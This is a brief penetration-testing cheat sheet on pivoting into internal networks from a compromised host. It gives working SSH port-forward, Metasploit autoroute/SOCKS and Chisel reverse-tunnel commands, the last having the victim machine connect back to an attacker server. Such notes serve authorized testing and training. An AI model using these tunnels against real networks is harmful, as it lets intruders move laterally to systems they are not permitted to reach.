## Pivoting Commands

Sometimes when you have access to an internal box, and want to route to something it can reach internally but your attack machine can't, you'll have to use some portforwarding. Here are just a couple of ways to do that!

### SSH

```bash
# Forward 8200 on 10.9.30.13 through the SSH session on 10.9.30.11. Then accessible at 127.0.0.1:8200
ssh -L 8200:10.9.30.13:8200 neo@10.9.30.11
```

### Proxychains


To set up proxychains using Metasploit's autoroute, use the following:

```bash
use autoroute
set session <Session ID>
run
set cmd add
set subnet <extra subnets>
run
search socks
use 0
set srvhost 127.0.0.1
set version 5
run
```

With a valid proxychains configuration, you can now use `proxychains <command>` and it will route through metasploit's new routing.

### Chisel 

```bash
# proxychains configuration set to the following at the end of /etc/proxychains.conf: 1080 127.0.0.1 socks5

# Kali
sudo ./chisel server -p 80 --reverse

# Windows
chisel.exe client 10.10.10.10:80 R:socks
```

We can then use proxychains over the chisel portforward.

```bash
proxychains curl 'http://172.16.1.1/some_internal_page' 
```